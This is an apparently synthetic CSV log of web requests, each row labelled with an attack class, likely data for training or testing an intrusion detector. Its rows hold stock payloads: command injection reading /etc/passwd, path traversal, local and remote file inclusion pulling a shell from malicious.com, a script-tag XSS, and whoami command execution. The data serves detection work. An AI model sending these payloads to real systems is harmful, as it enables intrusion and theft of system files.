ip,timestamp,request,status,size,attack_type
201.88.10.9,2025-03-15 12:23:52,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1361,COMMAND_INJECTION
224.243.195.194,2025-03-15 12:23:52,POST /change-email?email=attacker@example.com HTTP/1.1,200,3977,CSRF_ATTACK
97.205.29.180,2025-03-15 12:23:16,GET /etc/passwd HTTP/1.1,403,1808,PATH_TRAVERSAL
209.8.243.112,2025-03-15 12:23:44,POST /wp-json/wp/v2/users HTTP/1.1,403,2851,USER_ENUMERATION
227.247.188.192,2025-03-15 12:23:23,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3377,LFI_ATTACK
110.4.119.128,2025-03-15 12:23:05,POST /wp-json/wp/v2/users HTTP/1.1,403,1689,USER_ENUMERATION
31.26.115.105,2025-03-15 12:23:38,GET /etc/passwd HTTP/1.1,403,1037,PATH_TRAVERSAL
224.131.38.39,2025-03-15 12:23:25,POST /change-email?email=attacker@example.com HTTP/1.1,200,881,CSRF_ATTACK
48.187.65.218,2025-03-15 12:23:20,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2819,COMMAND_INJECTION
85.98.237.206,2025-03-15 12:23:39,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3016,XSS_ATTACK
219.182.115.246,2025-03-15 12:24:01,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3563,LFI_ATTACK
104.207.158.131,2025-03-15 12:23:19,POST /wp-json/wp/v2/users HTTP/1.1,403,774,USER_ENUMERATION
255.11.38.205,2025-03-15 12:23:43,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4920,LFI_ATTACK
90.130.93.99,2025-03-15 12:23:11,GET /execute?cmd=whoami HTTP/1.1,403,2386,RCE_ATTACK
14.231.95.25,2025-03-15 12:23:26,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4640,LFI_ATTACK
132.193.209.156,2025-03-15 12:23:36,POST /change-email?email=attacker@example.com HTTP/1.1,200,2604,CSRF_ATTACK
210.45.76.29,2025-03-15 12:23:24,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1296,REMOTE_FILE_INCLUSION
190.251.133.105,2025-03-15 12:23:55,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3855,REMOTE_FILE_INCLUSION
210.122.209.31,2025-03-15 12:23:32,POST /change-email?email=attacker@example.com HTTP/1.1,200,4584,CSRF_ATTACK
190.87.166.103,2025-03-15 12:23:03,POST /upload-xml HTTP/1.1,403,2782,XXE_ATTACK
147.84.234.80,2025-03-15 12:23:23,GET /api/user?username=admin HTTP/1.1,403,1569,API_ABUSE
146.193.13.12,2025-03-15 12:23:05,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3244,REMOTE_FILE_INCLUSION
102.55.226.12,2025-03-15 12:23:05,POST /change-email?email=attacker@example.com HTTP/1.1,200,3227,CSRF_ATTACK
110.220.14.53,2025-03-15 12:23:04,GET /etc/passwd HTTP/1.1,403,4629,PATH_TRAVERSAL
117.151.240.39,2025-03-15 12:23:19,POST /change-email?email=attacker@example.com HTTP/1.1,200,3618,CSRF_ATTACK
167.50.37.175,2025-03-15 12:23:21,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2512,LFI_ATTACK
191.65.209.87,2025-03-15 12:23:59,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4773,REMOTE_FILE_INCLUSION
12.101.171.143,2025-03-15 12:23:42,POST /change-email?email=attacker@example.com HTTP/1.1,200,4475,CSRF_ATTACK
145.9.2.68,2025-03-15 12:23:09,GET /api/user?username=admin HTTP/1.1,403,573,API_ABUSE
231.124.145.155,2025-03-15 12:23:13,GET /api/user?username=admin HTTP/1.1,403,1317,API_ABUSE
174.90.254.42,2025-03-15 12:23:50,GET /api/user?username=admin HTTP/1.1,403,929,API_ABUSE
45.148.147.133,2025-03-15 12:23:26,POST /upload-xml HTTP/1.1,403,3734,XXE_ATTACK
170.26.220.36,2025-03-15 12:23:15,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4580,LFI_ATTACK
96.237.138.224,2025-03-15 12:23:55,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1095,LFI_ATTACK
147.119.130.202,2025-03-15 12:23:51,POST /change-email?email=attacker@example.com HTTP/1.1,200,639,CSRF_ATTACK
79.101.171.38,2025-03-15 12:23:47,GET /etc/passwd HTTP/1.1,403,1486,PATH_TRAVERSAL
60.96.125.20,2025-03-15 12:23:59,POST /wp-json/wp/v2/users HTTP/1.1,403,1403,USER_ENUMERATION
224.8.132.66,2025-03-15 12:23:19,GET /etc/passwd HTTP/1.1,403,3972,PATH_TRAVERSAL
143.39.27.119,2025-03-15 12:23:05,POST /change-email?email=attacker@example.com HTTP/1.1,200,605,CSRF_ATTACK
242.68.223.191,2025-03-15 12:23:10,POST /change-email?email=attacker@example.com HTTP/1.1,200,4350,CSRF_ATTACK
201.117.70.240,2025-03-15 12:23:33,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4060,XSS_ATTACK
246.130.238.81,2025-03-15 12:23:59,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3781,COMMAND_INJECTION
44.202.216.36,2025-03-15 12:23:35,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3838,REMOTE_FILE_INCLUSION
217.8.131.174,2025-03-15 12:23:54,POST /wp-json/wp/v2/users HTTP/1.1,403,3568,USER_ENUMERATION
58.209.147.200,2025-03-15 12:23:34,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2565,COMMAND_INJECTION
84.115.131.49,2025-03-15 12:23:43,GET /execute?cmd=whoami HTTP/1.1,403,2651,RCE_ATTACK
242.48.143.15,2025-03-15 12:23:51,GET /execute?cmd=whoami HTTP/1.1,403,3016,RCE_ATTACK
190.68.177.130,2025-03-15 12:23:47,GET /api/user?username=admin HTTP/1.1,403,2432,API_ABUSE
219.210.207.109,2025-03-15 12:24:00,POST /upload-xml HTTP/1.1,403,523,XXE_ATTACK
173.169.115.179,2025-03-15 12:23:07,POST /upload-xml HTTP/1.1,403,1346,XXE_ATTACK
19.219.208.106,2025-03-15 12:23:56,GET /execute?cmd=whoami HTTP/1.1,403,3304,RCE_ATTACK
120.189.57.79,2025-03-15 12:23:57,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4082,XSS_ATTACK
112.42.213.132,2025-03-15 12:23:25,GET /api/user?username=admin HTTP/1.1,403,2249,API_ABUSE
106.102.113.53,2025-03-15 12:23:51,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4882,COMMAND_INJECTION
145.186.9.57,2025-03-15 12:23:59,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4248,XSS_ATTACK
48.59.115.92,2025-03-15 12:23:52,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4892,LFI_ATTACK
255.149.129.161,2025-03-15 12:23:19,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1225,XSS_ATTACK
3.202.41.26,2025-03-15 12:23:44,GET /execute?cmd=whoami HTTP/1.1,403,2470,RCE_ATTACK
21.98.229.77,2025-03-15 12:23:56,POST /change-email?email=attacker@example.com HTTP/1.1,200,1818,CSRF_ATTACK
118.71.118.136,2025-03-15 12:23:32,GET /etc/passwd HTTP/1.1,403,2534,PATH_TRAVERSAL
173.234.91.103,2025-03-15 12:23:50,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,797,REMOTE_FILE_INCLUSION
162.110.221.62,2025-03-15 12:23:08,POST /wp-json/wp/v2/users HTTP/1.1,403,3228,USER_ENUMERATION
100.109.205.24,2025-03-15 12:23:36,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3413,XSS_ATTACK
216.122.185.38,2025-03-15 12:23:19,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1116,LFI_ATTACK
226.90.216.212,2025-03-15 12:23:21,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2748,LFI_ATTACK
37.185.139.148,2025-03-15 12:23:11,GET /etc/passwd HTTP/1.1,403,3976,PATH_TRAVERSAL
93.65.120.130,2025-03-15 12:23:36,POST /change-email?email=attacker@example.com HTTP/1.1,200,1622,CSRF_ATTACK
143.141.116.137,2025-03-15 12:23:47,GET /etc/passwd HTTP/1.1,403,4286,PATH_TRAVERSAL
189.178.243.129,2025-03-15 12:23:13,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3184,REMOTE_FILE_INCLUSION
156.199.249.214,2025-03-15 12:23:23,GET /execute?cmd=whoami HTTP/1.1,403,5000,RCE_ATTACK
241.148.196.17,2025-03-15 12:23:36,GET /api/user?username=admin HTTP/1.1,403,3423,API_ABUSE
132.163.234.160,2025-03-15 12:23:25,GET /api/user?username=admin HTTP/1.1,403,3876,API_ABUSE
13.107.134.129,2025-03-15 12:23:06,GET /etc/passwd HTTP/1.1,403,2738,PATH_TRAVERSAL
186.234.35.78,2025-03-15 12:23:52,POST /change-email?email=attacker@example.com HTTP/1.1,200,4343,CSRF_ATTACK
7.28.30.1,2025-03-15 12:23:09,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1521,LFI_ATTACK
129.45.199.243,2025-03-15 12:23:52,GET /etc/passwd HTTP/1.1,403,3999,PATH_TRAVERSAL
27.53.25.71,2025-03-15 12:23:11,GET /api/user?username=admin HTTP/1.1,403,874,API_ABUSE
235.45.101.107,2025-03-15 12:23:32,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3874,COMMAND_INJECTION
15.117.220.232,2025-03-15 12:24:03,GET /api/user?username=admin HTTP/1.1,403,1419,API_ABUSE
28.38.212.180,2025-03-15 12:23:22,POST /change-email?email=attacker@example.com HTTP/1.1,200,4946,CSRF_ATTACK
254.209.100.134,2025-03-15 12:24:04,POST /change-email?email=attacker@example.com HTTP/1.1,200,910,CSRF_ATTACK
68.6.104.243,2025-03-15 12:23:31,POST /wp-json/wp/v2/users HTTP/1.1,403,4830,USER_ENUMERATION
158.203.8.248,2025-03-15 12:24:00,POST /upload-xml HTTP/1.1,403,4707,XXE_ATTACK
82.214.127.196,2025-03-15 12:23:40,POST /wp-json/wp/v2/users HTTP/1.1,403,4325,USER_ENUMERATION
239.118.143.10,2025-03-15 12:23:52,GET /etc/passwd HTTP/1.1,403,4802,PATH_TRAVERSAL
16.63.141.80,2025-03-15 12:23:43,GET /etc/passwd HTTP/1.1,403,4298,PATH_TRAVERSAL
221.247.203.16,2025-03-15 12:23:13,POST /wp-json/wp/v2/users HTTP/1.1,403,940,USER_ENUMERATION
60.174.99.159,2025-03-15 12:23:50,POST /upload-xml HTTP/1.1,403,4667,XXE_ATTACK
78.203.15.56,2025-03-15 12:24:04,GET /etc/passwd HTTP/1.1,403,4857,PATH_TRAVERSAL
213.114.173.146,2025-03-15 12:23:55,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4322,LFI_ATTACK
54.92.159.241,2025-03-15 12:23:39,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1770,REMOTE_FILE_INCLUSION
4.107.161.204,2025-03-15 12:23:28,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2963,COMMAND_INJECTION
84.252.19.65,2025-03-15 12:23:15,GET /etc/passwd HTTP/1.1,403,2830,PATH_TRAVERSAL
62.133.185.195,2025-03-15 12:23:37,POST /upload-xml HTTP/1.1,403,883,XXE_ATTACK
132.100.223.240,2025-03-15 12:23:42,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3406,REMOTE_FILE_INCLUSION
166.72.209.149,2025-03-15 12:23:46,POST /wp-json/wp/v2/users HTTP/1.1,403,2341,USER_ENUMERATION
147.15.109.113,2025-03-15 12:24:04,GET /execute?cmd=whoami HTTP/1.1,403,1242,RCE_ATTACK
20.37.132.198,2025-03-15 12:23:36,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1437,LFI_ATTACK
54.8.146.253,2025-03-15 12:24:00,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3479,LFI_ATTACK
52.117.5.130,2025-03-15 12:23:10,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,547,REMOTE_FILE_INCLUSION
123.72.121.12,2025-03-15 12:23:10,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3804,XSS_ATTACK
177.74.74.193,2025-03-15 12:24:06,GET /execute?cmd=whoami HTTP/1.1,403,1846,RCE_ATTACK
220.122.216.17,2025-03-15 12:23:27,GET /api/user?username=admin HTTP/1.1,403,3199,API_ABUSE
245.108.21.3,2025-03-15 12:23:32,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2265,REMOTE_FILE_INCLUSION
203.229.0.192,2025-03-15 12:23:31,POST /change-email?email=attacker@example.com HTTP/1.1,200,3180,CSRF_ATTACK
227.245.20.43,2025-03-15 12:23:56,GET /execute?cmd=whoami HTTP/1.1,403,2913,RCE_ATTACK
140.60.9.54,2025-03-15 12:23:52,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2684,LFI_ATTACK
125.180.76.86,2025-03-15 12:24:06,GET /etc/passwd HTTP/1.1,403,3135,PATH_TRAVERSAL
223.23.22.54,2025-03-15 12:24:05,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1031,COMMAND_INJECTION
81.174.67.50,2025-03-15 12:23:11,POST /wp-json/wp/v2/users HTTP/1.1,403,2151,USER_ENUMERATION
180.73.227.34,2025-03-15 12:23:20,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3515,COMMAND_INJECTION
208.84.202.53,2025-03-15 12:23:45,GET /execute?cmd=whoami HTTP/1.1,403,2116,RCE_ATTACK
99.89.125.92,2025-03-15 12:23:08,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3860,LFI_ATTACK
8.220.174.127,2025-03-15 12:23:24,GET /api/user?username=admin HTTP/1.1,403,4450,API_ABUSE
143.100.93.218,2025-03-15 12:23:47,POST /upload-xml HTTP/1.1,403,957,XXE_ATTACK
24.51.237.90,2025-03-15 12:23:46,GET /etc/passwd HTTP/1.1,403,507,PATH_TRAVERSAL
72.144.128.247,2025-03-15 12:23:22,GET /etc/passwd HTTP/1.1,403,4886,PATH_TRAVERSAL
112.12.178.123,2025-03-15 12:23:36,POST /change-email?email=attacker@example.com HTTP/1.1,200,953,CSRF_ATTACK
3.36.217.51,2025-03-15 12:23:14,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4362,LFI_ATTACK
41.9.155.16,2025-03-15 12:23:45,GET /api/user?username=admin HTTP/1.1,403,3174,API_ABUSE
51.61.75.102,2025-03-15 12:23:37,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2579,REMOTE_FILE_INCLUSION
135.207.153.185,2025-03-15 12:23:32,POST /upload-xml HTTP/1.1,403,4678,XXE_ATTACK
221.147.81.18,2025-03-15 12:23:50,POST /upload-xml HTTP/1.1,403,3727,XXE_ATTACK
140.200.193.58,2025-03-15 12:23:37,GET /etc/passwd HTTP/1.1,403,2409,PATH_TRAVERSAL
71.96.243.38,2025-03-15 12:23:48,GET /etc/passwd HTTP/1.1,403,2605,PATH_TRAVERSAL
69.108.174.231,2025-03-15 12:23:39,POST /wp-json/wp/v2/users HTTP/1.1,403,2869,USER_ENUMERATION
70.92.39.47,2025-03-15 12:23:50,POST /wp-json/wp/v2/users HTTP/1.1,403,1353,USER_ENUMERATION
255.36.176.232,2025-03-15 12:23:15,GET /etc/passwd HTTP/1.1,403,2148,PATH_TRAVERSAL
7.18.68.246,2025-03-15 12:23:40,POST /upload-xml HTTP/1.1,403,2906,XXE_ATTACK
84.198.37.176,2025-03-15 12:23:44,POST /upload-xml HTTP/1.1,403,4385,XXE_ATTACK
216.48.8.4,2025-03-15 12:23:15,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1466,COMMAND_INJECTION
235.184.87.35,2025-03-15 12:23:09,GET /api/user?username=admin HTTP/1.1,403,3101,API_ABUSE
228.112.180.30,2025-03-15 12:23:34,POST /upload-xml HTTP/1.1,403,3528,XXE_ATTACK
212.224.39.177,2025-03-15 12:23:39,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4224,COMMAND_INJECTION
136.95.181.189,2025-03-15 12:23:59,GET /etc/passwd HTTP/1.1,403,1952,PATH_TRAVERSAL
137.9.180.102,2025-03-15 12:23:09,GET /etc/passwd HTTP/1.1,403,3912,PATH_TRAVERSAL
185.194.41.85,2025-03-15 12:23:44,POST /upload-xml HTTP/1.1,403,950,XXE_ATTACK
235.123.117.246,2025-03-15 12:23:13,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3157,REMOTE_FILE_INCLUSION
115.160.152.58,2025-03-15 12:23:33,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3467,REMOTE_FILE_INCLUSION
212.198.65.141,2025-03-15 12:23:40,POST /change-email?email=attacker@example.com HTTP/1.1,200,2807,CSRF_ATTACK
57.130.37.116,2025-03-15 12:23:16,POST /change-email?email=attacker@example.com HTTP/1.1,200,4363,CSRF_ATTACK
75.108.47.125,2025-03-15 12:23:22,POST /upload-xml HTTP/1.1,403,3670,XXE_ATTACK
244.51.196.40,2025-03-15 12:23:13,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4913,LFI_ATTACK
145.1.129.250,2025-03-15 12:23:13,GET /api/user?username=admin HTTP/1.1,403,3741,API_ABUSE
190.88.93.103,2025-03-15 12:23:56,GET /execute?cmd=whoami HTTP/1.1,403,4197,RCE_ATTACK
142.180.14.242,2025-03-15 12:23:27,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3995,XSS_ATTACK
206.172.27.81,2025-03-15 12:23:47,POST /wp-json/wp/v2/users HTTP/1.1,403,2419,USER_ENUMERATION
180.213.151.131,2025-03-15 12:23:30,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3584,REMOTE_FILE_INCLUSION
177.251.23.162,2025-03-15 12:24:09,GET /etc/passwd HTTP/1.1,403,1491,PATH_TRAVERSAL
65.66.62.28,2025-03-15 12:23:22,GET /execute?cmd=whoami HTTP/1.1,403,1123,RCE_ATTACK
40.108.28.128,2025-03-15 12:23:55,POST /change-email?email=attacker@example.com HTTP/1.1,200,1795,CSRF_ATTACK
58.235.209.163,2025-03-15 12:23:56,POST /wp-json/wp/v2/users HTTP/1.1,403,4002,USER_ENUMERATION
252.147.212.100,2025-03-15 12:23:29,POST /wp-json/wp/v2/users HTTP/1.1,403,552,USER_ENUMERATION
86.44.23.191,2025-03-15 12:23:49,GET /execute?cmd=whoami HTTP/1.1,403,3670,RCE_ATTACK
180.197.253.156,2025-03-15 12:23:25,POST /change-email?email=attacker@example.com HTTP/1.1,200,4387,CSRF_ATTACK
47.42.100.219,2025-03-15 12:24:07,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4527,LFI_ATTACK
218.235.200.61,2025-03-15 12:23:59,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1839,COMMAND_INJECTION
44.0.26.228,2025-03-15 12:23:51,POST /change-email?email=attacker@example.com HTTP/1.1,200,3865,CSRF_ATTACK
145.103.179.202,2025-03-15 12:23:15,POST /change-email?email=attacker@example.com HTTP/1.1,200,3377,CSRF_ATTACK
224.23.188.202,2025-03-15 12:23:33,GET /execute?cmd=whoami HTTP/1.1,403,3048,RCE_ATTACK
89.217.249.11,2025-03-15 12:24:01,POST /wp-json/wp/v2/users HTTP/1.1,403,4795,USER_ENUMERATION
49.92.195.24,2025-03-15 12:23:44,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3192,LFI_ATTACK
233.219.147.96,2025-03-15 12:23:23,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2621,COMMAND_INJECTION
85.54.146.130,2025-03-15 12:23:18,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4758,COMMAND_INJECTION
57.24.155.186,2025-03-15 12:23:58,POST /change-email?email=attacker@example.com HTTP/1.1,200,4706,CSRF_ATTACK
58.15.237.255,2025-03-15 12:23:23,POST /change-email?email=attacker@example.com HTTP/1.1,200,3001,CSRF_ATTACK
143.84.195.237,2025-03-15 12:23:32,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3414,REMOTE_FILE_INCLUSION
125.11.140.118,2025-03-15 12:23:57,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2299,REMOTE_FILE_INCLUSION
31.244.233.80,2025-03-15 12:23:14,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4753,LFI_ATTACK
137.23.133.209,2025-03-15 12:23:50,GET /etc/passwd HTTP/1.1,403,2783,PATH_TRAVERSAL
128.146.246.203,2025-03-15 12:23:29,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2401,REMOTE_FILE_INCLUSION
174.21.252.46,2025-03-15 12:23:26,POST /change-email?email=attacker@example.com HTTP/1.1,200,2832,CSRF_ATTACK
252.55.96.11,2025-03-15 12:23:59,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2762,COMMAND_INJECTION
25.80.235.58,2025-03-15 12:23:46,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1387,COMMAND_INJECTION
143.166.241.10,2025-03-15 12:24:05,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4087,LFI_ATTACK
222.51.111.7,2025-03-15 12:23:50,GET /api/user?username=admin HTTP/1.1,403,3411,API_ABUSE
3.81.176.199,2025-03-15 12:23:10,GET /api/user?username=admin HTTP/1.1,403,669,API_ABUSE
220.250.39.171,2025-03-15 12:23:56,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2841,REMOTE_FILE_INCLUSION
207.219.73.148,2025-03-15 12:23:43,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3678,LFI_ATTACK
50.3.31.4,2025-03-15 12:24:04,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3715,COMMAND_INJECTION
107.48.65.86,2025-03-15 12:23:34,POST /upload-xml HTTP/1.1,403,3374,XXE_ATTACK
171.44.1.236,2025-03-15 12:24:07,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,840,COMMAND_INJECTION
119.55.116.245,2025-03-15 12:24:05,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3600,COMMAND_INJECTION
14.78.56.149,2025-03-15 12:23:20,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1342,XSS_ATTACK
18.243.208.58,2025-03-15 12:23:57,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1550,XSS_ATTACK
167.18.191.108,2025-03-15 12:23:12,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2074,REMOTE_FILE_INCLUSION
101.32.43.106,2025-03-15 12:23:41,GET /etc/passwd HTTP/1.1,403,4903,PATH_TRAVERSAL
69.167.249.31,2025-03-15 12:23:22,GET /api/user?username=admin HTTP/1.1,403,3346,API_ABUSE
242.56.80.222,2025-03-15 12:23:50,GET /api/user?username=admin HTTP/1.1,403,2908,API_ABUSE
119.220.236.171,2025-03-15 12:23:43,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3828,REMOTE_FILE_INCLUSION
94.200.17.179,2025-03-15 12:23:56,GET /api/user?username=admin HTTP/1.1,403,3625,API_ABUSE
188.6.250.129,2025-03-15 12:23:30,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2397,REMOTE_FILE_INCLUSION
69.246.101.8,2025-03-15 12:23:38,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4605,XSS_ATTACK
121.42.29.164,2025-03-15 12:23:53,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3544,REMOTE_FILE_INCLUSION
34.69.150.79,2025-03-15 12:23:58,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,962,XSS_ATTACK
232.190.45.198,2025-03-15 12:24:02,POST /upload-xml HTTP/1.1,403,2650,XXE_ATTACK
75.252.60.197,2025-03-15 12:24:11,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3015,LFI_ATTACK
155.18.78.248,2025-03-15 12:23:42,POST /change-email?email=attacker@example.com HTTP/1.1,200,4116,CSRF_ATTACK
10.114.232.181,2025-03-15 12:23:22,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4386,COMMAND_INJECTION
12.1.220.248,2025-03-15 12:23:13,POST /change-email?email=attacker@example.com HTTP/1.1,200,4303,CSRF_ATTACK
117.73.17.211,2025-03-15 12:24:04,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1013,XSS_ATTACK
106.153.59.24,2025-03-15 12:24:11,POST /change-email?email=attacker@example.com HTTP/1.1,200,2649,CSRF_ATTACK
153.18.75.118,2025-03-15 12:23:50,GET /execute?cmd=whoami HTTP/1.1,403,2884,RCE_ATTACK
132.149.120.125,2025-03-15 12:23:44,GET /execute?cmd=whoami HTTP/1.1,403,4443,RCE_ATTACK
195.165.30.34,2025-03-15 12:24:05,GET /etc/passwd HTTP/1.1,403,1683,PATH_TRAVERSAL
144.107.165.213,2025-03-15 12:24:06,POST /wp-json/wp/v2/users HTTP/1.1,403,991,USER_ENUMERATION
190.240.9.174,2025-03-15 12:24:03,POST /change-email?email=attacker@example.com HTTP/1.1,200,3724,CSRF_ATTACK
134.203.2.6,2025-03-15 12:23:22,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1719,XSS_ATTACK
246.75.105.240,2025-03-15 12:23:20,POST /upload-xml HTTP/1.1,403,1280,XXE_ATTACK
11.180.131.89,2025-03-15 12:23:30,POST /wp-json/wp/v2/users HTTP/1.1,403,1177,USER_ENUMERATION
158.141.155.173,2025-03-15 12:23:28,GET /etc/passwd HTTP/1.1,403,3080,PATH_TRAVERSAL
215.95.119.41,2025-03-15 12:23:22,GET /execute?cmd=whoami HTTP/1.1,403,3051,RCE_ATTACK
250.125.22.83,2025-03-15 12:24:07,POST /change-email?email=attacker@example.com HTTP/1.1,200,3583,CSRF_ATTACK
171.99.51.107,2025-03-15 12:24:09,GET /api/user?username=admin HTTP/1.1,403,1951,API_ABUSE
51.48.175.92,2025-03-15 12:23:25,GET /etc/passwd HTTP/1.1,403,574,PATH_TRAVERSAL
218.95.137.33,2025-03-15 12:24:11,GET /execute?cmd=whoami HTTP/1.1,403,3924,RCE_ATTACK
15.83.27.230,2025-03-15 12:24:11,POST /change-email?email=attacker@example.com HTTP/1.1,200,1837,CSRF_ATTACK
70.213.250.227,2025-03-15 12:23:46,GET /execute?cmd=whoami HTTP/1.1,403,3556,RCE_ATTACK
82.114.69.71,2025-03-15 12:23:16,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2941,LFI_ATTACK
122.148.253.2,2025-03-15 12:23:47,POST /change-email?email=attacker@example.com HTTP/1.1,200,4817,CSRF_ATTACK
241.244.172.50,2025-03-15 12:23:40,GET /api/user?username=admin HTTP/1.1,403,2873,API_ABUSE
180.251.70.60,2025-03-15 12:24:12,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2386,REMOTE_FILE_INCLUSION
179.2.190.48,2025-03-15 12:23:32,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2103,XSS_ATTACK
55.93.44.37,2025-03-15 12:23:25,POST /wp-json/wp/v2/users HTTP/1.1,403,907,USER_ENUMERATION
